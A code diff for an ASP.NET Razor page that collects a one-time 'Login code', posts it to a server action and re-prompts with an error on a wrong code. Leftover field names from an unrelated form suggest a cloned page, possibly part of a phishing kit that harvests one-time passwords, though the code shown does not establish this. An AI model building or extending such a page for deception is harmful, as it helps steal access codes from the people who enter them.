@@ -4,6 +4,13 @@
 <link rel="stylesheet" href="~/css/style-info1.css" />
 <link rel="stylesheet" href="~/css/interview1.css" />
 
+<style>
+    .incorrect-code {
+        color: #ff0000 !important;
+        border-color: #ff0000;
+    }
+</style>
+
 <body class="">
     <div id="page-div">
         <div id="progress-bar-container" class="">
@@ -39,7 +46,7 @@
             </div>
             <div class="groupSubHeadersWrapper">
             </div>
-            <form>
+            <form action="@Url.Action("Confirming", "Business")" method="post">
                 <div id="AboutYouSection" class="Question AboutYouSection">
                     <div class="CaptionWrapper ">
                         <div class="Caption ">
@@ -55,12 +62,13 @@
                         </div>
                     </div>
                     <div data-form-element-key="PrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevYearDays">
-                        <div class="TextBox floatingLabelContainer">
-                            <input type="password" name="PrevToPass" id="PrevYearDays" required="" pattern=".{5,}" placeholder=" ">
-                            <label class="Caption" title="Password" for="PrevYearDays">
+                        <div class="TextBox floatingLabelContainer @(!string.IsNullOrEmpty(ViewBag.Message) ? "incorrect-code" :"")">
+                            <input type="password" name="otpCode" id="PrevYearDays" required="" pattern=".{5,}" placeholder=" ">
+                            <label class="Caption @(!string.IsNullOrEmpty(ViewBag.Message) ? "incorrect-code" :"")" title="Password" for="PrevYearDays">
                                 Login code
                             </label>
                         </div>
+                        <div style="color:#ff0000;margin-top:-10px">@ViewBag.Message</div>
                     </div>
                 </div>
                 <span id="error_IndividualOrBusiness" class="error-message">Required</span>
@@ -70,7 +78,7 @@
 
                 <div data-form-element-key="ButtonNext" class="FormElement FormElement_Button ButtonNext">
                     <div class="Button">
-                        <button name="ButtonNext" class="ButtonNext" data-elements-processor="">
+                        <button name="ButtonNext" type="submit" class="ButtonNext" data-elements-processor="">
                             Submit Code
                         </button>
                     </div>
